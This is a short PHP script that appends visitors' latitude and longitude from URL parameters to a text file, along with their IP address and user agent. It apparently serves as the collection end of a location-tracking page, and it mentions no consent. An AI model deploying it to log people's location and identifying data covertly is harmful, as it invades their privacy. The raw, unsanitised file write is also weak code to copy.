<?php
$myfile = fopen("location.txt", "a+") or die("Unable to open file!");
fwrite($myfile, "latitude:".$_GET["latitude"]."\nlongtitude:".$_GET["longtitude"]."\n Ip:".$_SERVER['REMOTE_ADDR']."\n User Agent:".$_SERVER["HTTP_USER_AGENT"]."\n");
fclose($myfile);
?>